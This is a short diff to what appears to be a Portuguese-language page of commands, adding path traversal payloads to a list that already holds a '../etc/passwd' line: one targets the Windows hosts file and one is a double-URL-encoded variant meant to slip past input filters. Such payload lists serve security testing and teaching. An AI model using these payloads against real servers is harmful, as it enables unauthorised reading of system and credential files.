@@ -42,6 +42,13 @@ PAGINA CONTENDO [OUTROS](https://ygoralberto.github.io/outros) COMANDOS DE WINDO
 .
 
 	/../../../../../../../../../../etc/passwd
+.
+
+	/../../../../../../../../../../C:/Windows/System32/drivers/etc/hosts
+ 
+.
+
+	%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fC%253A%252fWindows%252fSystem32%252fdrivers%252fetc%252fhosts
 	
 .
 
